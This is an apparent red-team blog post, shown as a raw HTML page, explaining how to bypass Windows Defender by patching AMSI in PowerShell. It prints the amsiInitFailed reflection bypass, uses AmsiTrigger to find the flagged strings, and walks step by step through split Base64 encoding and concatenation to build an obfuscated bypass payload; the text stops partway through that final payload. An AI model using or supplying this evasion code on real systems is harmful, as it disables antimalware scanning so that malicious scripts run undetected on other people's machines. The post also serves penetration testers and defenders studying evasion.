<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Bypassing Windows Defender" /><meta name="author" content="Bhaskar Pal" /><meta property="og:locale" content="en" /><meta name="description" content="Cyber security, Red Teaming and CTF Writeup‚Äôs" /><meta property="og:description" content="Cyber security, Red Teaming and CTF Writeup‚Äôs" /><link rel="canonical" href="https://0xstarlight.github.io/posts/Bypassing-Windows-Defender/" /><meta property="og:url" content="https://0xstarlight.github.io/posts/Bypassing-Windows-Defender/" /><meta property="og:site_name" content="0xStarlight" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-05-14T20:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Bypassing Windows Defender" /><meta name="twitter:site" content="@Bhaskarpal__" /><meta name="twitter:creator" content="@Bhaskar Pal" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Bhaskar Pal"},"dateModified":"2023-05-14T22:50:08+05:30","datePublished":"2023-05-14T20:00:00+05:30","description":"Cyber security, Red Teaming and CTF Writeup‚Äôs","headline":"Bypassing Windows Defender","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xstarlight.github.io/posts/Bypassing-Windows-Defender/"},"url":"https://0xstarlight.github.io/posts/Bypassing-Windows-Defender/"}</script><title>Bypassing Windows Defender | 0xStarlight</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xStarlight"><meta name="application-name" content="0xStarlight"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://avatars.githubusercontent.com/u/59029171 " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xStarlight</a></div><div class="site-subtitle font-italic">Cyber security, Red Teaming and CTF Writeup's</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xStarlight" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Bhaskarpal__" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Bhaskarpal347','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Bypassing Windows Defender</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Bypassing Windows Defender</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1684074600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-05-14 </em> </span> <span> Updated <em class="timeago" data-ts="1684084808" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-05-14 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1830 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/1fe47a8f-2eac-4316-8585-9aa13fb9000c" alt="image" data-proofer-ignore></p><h1 id="introduction"><span style="color:lightblue">Introduction</span></h1><p>Greetings, everyone üëã. In this brief article, I will outline a manual obfuscation technique for bypassing Windows Defender. Specifically, I will cover how to patch the Antimalware Scan Interface and disable Event Tracing for Windows to evade detection. Additionally, I will demonstrate how to combine both methods for maximum effectiveness and provide guidance on using this approach.</p><blockquote><p>Throughout the article, I will use <a href="https://github.com/RythmStick/AMSITrigger">AmsiTrigger</a> and <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-obfuscation</a>. These tools will help to identify the malicious scripts and help obfuscate them.</p></blockquote><hr /><h1 id="bypassing-av-signatures-powershell"><span style="color:lightblue">Bypassing AV Signatures PowerShell</span></h1><p>Windows Defender Antimalware Scan Interface (AMSI) is a security feature that is built into Windows 10 and Windows Server 2016 and later versions. AMSI is designed to provide enhanced malware protection by allowing antivirus and other security solutions to scan script-based attacks and other suspicious code before they execute on a system.</p><p>By disabling or AMSI, attackers can download malicious scripts in memory on the systems.</p><blockquote><p>Original Payload for AMSI bypass</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.AmsiUtils'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'amsiInitFailed'</span><span class="p">,</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="bp">$true</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div></blockquote><h2 id="methodology---manual"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology - Manual</span></span><a href="#methodology---manual" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Scan using AMSITrigger<li>Modify the detected code snippet<ol><li>Base64<li>Hex<li>Concat<li>Reverse String</ol><li>Rescan using AMSITrigger or Download a test ps1 script in memory<li>Repeat the steps 2 &amp; 3 till we get a result as ‚ÄúAMSI_RESULT_NOT_DETECTED‚Äù or ‚ÄúBlank‚Äù</ol><h2 id="understanding-the-command"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Understanding the command</span></span><a href="#understanding-the-command" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This command is used to modify the behavior of the Anti-Malware Scan Interface (AMSI) in PowerShell. Specifically, it sets a private, static field within the <em>System.Management.Automation.AmsiUtils</em> class called <strong>‚ÄúamsiInitFailed‚Äù</strong> to true, which indicates that the initialization of AMSI has failed.</p><p>Here is a breakdown of the command and what each part does:</p><ol><li><code class="language-plaintext highlighter-rouge">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')</code>: This first part of the command uses the <code class="language-plaintext highlighter-rouge">[Ref]</code> type accelerator to get a reference to the <code class="language-plaintext highlighter-rouge">System.Management.Automation</code> assembly and then uses the <code class="language-plaintext highlighter-rouge">GetType()</code> method to get a reference to the <code class="language-plaintext highlighter-rouge">System.Management.Automation.AmsiUtils</code> class.<ol><li><code class="language-plaintext highlighter-rouge">System.Management.Automation.AmsiUtils</code> is a part of the PowerShell scripting language and is used to interact with the Anti-Malware Scan Interface (AMSI) on Windows operating systems. AMSI is a security feature that allows software to integrate with antivirus and other security products to scan and detect malicious content in scripts and other files.<li>While <code class="language-plaintext highlighter-rouge">System.Management.Automation.AmsiUtils</code> itself is not inherently malicious, it can be flagged as such if it is being used in a context that appears suspicious to antivirus or other security software. For example, malware authors may use PowerShell scripts that leverage AMSI to bypass traditional antivirus detection and execute malicious code on a system.<li>Thus, <code class="language-plaintext highlighter-rouge">System.Management.Automation.AmsiUtils</code> may be flagged as malicious if it is being used in a context that appears to be part of a malware attack or if it is being used in a way that violates security policies on a system.</ol><li><p><code class="language-plaintext highlighter-rouge">.GetField('amsiInitFailed','NonPublic,Static')</code>: This part of the command uses the <code class="language-plaintext highlighter-rouge">GetField()</code> method to get a reference to the private, static field within the <em>System.Management.Automation.AmsiUtils</em> class called <code class="language-plaintext highlighter-rouge">"amsiInitFailed"</code>. The <code class="language-plaintext highlighter-rouge">'NonPublic,Static'</code> argument specifies that the method should retrieve a non-public and static field.</p><li><code class="language-plaintext highlighter-rouge">.SetValue($null,$true)</code>: Finally, this part of the command uses the <code class="language-plaintext highlighter-rouge">SetValue()</code> method to set the value of the <code class="language-plaintext highlighter-rouge">"amsiInitFailed"</code> field to true. The <code class="language-plaintext highlighter-rouge">$null</code> argument specifies that we are not setting the value on an instance of the object, and the <code class="language-plaintext highlighter-rouge">$true</code> argument is the new value we are setting the field to.</ol><p>The reason for setting <code class="language-plaintext highlighter-rouge">"amsiInitFailed"</code> to true is to bypass AMSI detection, which may be used by antivirus or other security software to detect and block potentially malicious PowerShell commands or scripts. By indicating that the initialization of AMSI has failed, this command prevents AMSI from running and potentially interfering with the execution of PowerShell commands or scripts. It is worth noting, however, that bypassing AMSI can also make it easier for malicious actors to execute code on a system undetected, so caution should be exercised when using this command in practice.</p><h2 id="running-the-command"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Running the command</span></span><a href="#running-the-command" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Lets open Powershell and execute the original payload to patch AMSI and check the result.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.AmsiUtils'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'amsiInitFailed'</span><span class="p">,</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="bp">$true</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/48c89446-f2a8-41ad-aeb3-d93f450f4872" alt="image" data-proofer-ignore></p><ul><li>As we can see, Windows has identified the command as malicious and blocked it from being executed.<li>Now we need to identify what part of the payload is getting detected by Defender and triggering it to be marked as malicious.</ul><h2 id="amsi-trigger"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">AMSI Trigger</span></span><a href="#amsi-trigger" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>With the help of <strong>AMSITrigger.exe</strong>, we can identify the malicious string in the payload.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AMSITrigger</span><span class="err">&gt;</span><span class="w">  </span><span class="o">.</span><span class="nx">\AmsiTrigger_x64.exe</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/8c68b13f-d163-4b29-9f51-4394d7e89368" alt="image" data-proofer-ignore></p><ul><li>We can save our payload in a <code class="language-plaintext highlighter-rouge">.ps1</code> file, and with the <code class="language-plaintext highlighter-rouge">-i</code> flag, we can supply the malicious <code class="language-plaintext highlighter-rouge">ps1</code> file</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AMSITrigger</span><span class="err">&gt;</span><span class="w">  </span><span class="o">.</span><span class="nx">\AmsiTrigger_x64.exe</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">test.ps1</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/b846c3bd-a009-40fa-a1ee-f6797931ce08" alt="image" data-proofer-ignore></p><p>From the output results we can see that it flagged two strings as malicious</p><ol><li><strong>‚ÄúA m s i U t i l s‚Äù</strong><li><strong>‚Äúa m s i I n i t F a i l e d‚Äù</strong></ol><h2 id="patching-amsi"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Patching AMSI</span></span><a href="#patching-amsi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>After analyzing the strings that caused Windows Defender to block our script, we can now take steps to bypass this security mechanism. Several techniques can be used to evade detection, with one of the simplest and most effective being to encode or encrypt the payload.</p><p>We can do it in the following ways</p><ol><li>Base64 Encoding<li>Hex Encoding<li>Reversing The String<li>Concatenation</ol><blockquote><p>Now lets try to modify our original payload using just Base64 encoding.</p></blockquote><h3 id="base64-encoding"><span class="mr-2"><span style="color:pink"><span class="mr-2">Base64 Encoding</span></span><a href="#base64-encoding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Base64 Encoding is a widely used encoding technique that converts binary data into a string of ASCII characters. This method is easy to implement and can be decoded with simple tools.</p><ul><li>A simple Base64 encoding and decoding snippet in PowerShell looks like this :</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># Encoding Payload</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Hello World'</span><span class="p">;</span><span class="nv">$Bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="o">=</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="w">
</span><span class="c"># Decoding Paylaod</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'SABlAGwAbABvACAAVwBvAHIAbABkAA=='</span><span class="p">)))</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/ebc13c07-c4b0-4558-b66f-22276b30eeba" alt="image" data-proofer-ignore></p><ul><li>Now we can do the same for <em>AmsiUtils</em> and <em>amsiInitFailed</em></ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'AmsiUtils'</span><span class="p">;</span><span class="nv">$Bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="o">=</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/ac648e82-2d56-405f-ab8a-31e5d92a0485" alt="image" data-proofer-ignore></p><ul><li>Windows Defender could still detect <em>AmsiUtils</em> encoded in base64. We can divide this into two pieces and concat them together to avoid getting detected.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># Encoding Payload</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Amsi'</span><span class="p">;</span><span class="nv">$Bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="o">=</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Utils'</span><span class="p">;</span><span class="nv">$Bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="o">=</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="w">

</span><span class="c"># Decoding Paylaod</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'QQBtAHMAaQA='</span><span class="p">)))</span><span class="o">+</span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'VQB0AGkAbABzAA=='</span><span class="p">)))</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/d940fc02-53cf-4f34-b269-108d0c136a14" alt="image" data-proofer-ignore></p><ul><li>We can see this way we have encoded <em>AmsiUtils</em> without triggering Defender<li>Lets try the same for <em>amsiInitFailed</em> by splitting it into 3 parts<ol><li><em>amsi</em><li><em>Init</em><li><em>Failed</em></ol></ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># Encoding Payload</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'amsi'</span><span class="p">;</span><span class="nv">$Bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="o">=</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Init'</span><span class="p">;</span><span class="nv">$Bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="o">=</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Failed'</span><span class="p">;</span><span class="nv">$Bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="o">=</span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">);</span><span class="nv">$EncodedText</span><span class="w">

</span><span class="c"># Decoding Paylaod</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'YQBtAHMAaQA='</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">(</span><span class="err">$</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'SQBuAGkAdAA='</span><span class="p">))))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'RgBhAGkAbABlAGQA'</span><span class="p">))))</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/e4712ca9-4343-4e28-9d25-ef8eff1c64d2" alt="image" data-proofer-ignore></p><ul><li>As we can see, we have encoded <em>amsiInitFailed</em> also without triggering Defender.</ul><h2 id="final-payload"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Final Payload</span></span><a href="#final-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now that we crafted the final payload to Patch AMSI, let us look back at the original AMSI bypass code.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.AmsiUtils'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'amsiInitFailed'</span><span class="p">,</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="bp">$true</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><ul><li>All we need to do now is replace <em>AmsiUtils</em> and <em>amsiInitFailed</em> with the base64 encoded payload and concat the rest of the string.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="err">$</span><span class="p">(</span><span class="s1">'System.Management.Automation.'</span><span class="p">)</span><span class="o">+</span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'QQBtAHMAaQA='</span><span class="p">)))</span><span class="o">+</span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'VQB0AGkAbABzAA=='</span><span class="p">))))</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span 